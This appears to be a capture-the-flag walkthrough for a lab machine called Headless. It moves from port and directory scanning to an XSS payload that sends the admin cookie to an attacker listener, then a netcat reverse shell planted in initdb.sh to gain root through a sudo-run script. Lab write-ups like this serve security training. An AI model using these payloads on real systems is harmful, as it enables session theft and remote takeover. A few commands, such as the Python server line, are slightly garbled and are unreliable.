
# Task List

## Task 1: Highest TCP port available
- From next command: `nmap -sC -sV --min-rate 100 -vvv [IP]`

**Result:**
- Scanning 10.10.11.8 [1000 ports]
- Discovered open port 22/tcp on 10.10.11.8
- Discovered open port 5000/tcp on 10.10.11.8

## Task 2: Title of the page if the site detects an attack in the contact support form

- Log in to the web page at `IP:5000`
- Execute `<script>alert("TestMessage")</script>`

**Result:** Hacking Attempt Detected  
_Client Request Information_

## Task 3: Name of the cookie set for a logged-in user

- From the "Client Request Information," get the "Cookie" parameter

**Result:** is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs

## Task 4: Relative URL of the page requiring authorization on Headless

- Command using FFUF: `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://IP:5000/FUZZ`
- Explanation: `ffuf (wordlist parameter) (wordlist path) (objective parameter) (objective url)`

**Result:** 
- 10.10.11.8:5000/support
- 10.10.11.8:5000/dashboard *Response*

## EXTRA: Access to the dashboard

- Start an HTTP server with Python on port 8001: `python3 http.server 8001`
- Send a request to the /support directory with Burp Suite
- Change any label content with the XSS exploit: `<script>var i=new Image(); i.src="http://xx.xx.xx.xx:8001/?cookie="+btoa(document.cookie);</script>`, replacing `XX` with your IP.
- Use the Proxy and Repeater in Burp Suite to send multiple modified requests
- Check the server for cached data

**Result:**  
xx.xx.xx.xx - - [29/Jul/2024 14:00:56] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -

**Action:** Decrypt the cookie (Base64):  
`echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d`

**Result:** is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0% 

**Action 2:** Use the decrypted cookie to access the `/dashboard`

**Result:** Access Guaranteed

## Task 5: Parameter name on POST requests to /dashboard with a vulnerability

- Identify the form type

**Result:** Date

## Task 6: Name of the user the web application is running as

- Gain access to the machine
- Hint: Use a reverse shell and `nc` with the admin cookie

**Result:**  
Access to the machine  
User: dvir  
Use `python3 -c "import pty; pty.spawn('/bin/bash')"` to spawn a shell

## Task 7: Submit USER flag

- Use `ls -la` to list files in the home directory and find `user.txt`
- Use `cat user.txt`

**Result:** Submission of the USER flag

## Task 8: Full path to the script `dvir` can run without a password

- Use the command: `sudo -l`

**Result:** `/usr/sh/syscheck`

## Task 9: Script called with a relative path by `syscheck`

- Inspect the `syscheck.sh` script

**Result:** `initdb.sh`

## Task 10: Submit the flag in the root user's home directory

- Modify `initdb.sh` to append: `nc -e /bin/bash xx.xx.xx.xx PORT`
- Open a new terminal and use `nc -lvp PORT`
- Execute the script

**Extra Hint:** Use the same process as for the user shell access

**Result:** Access to a shell as the root user  
Navigate to the root directory and use `cat root.txt`
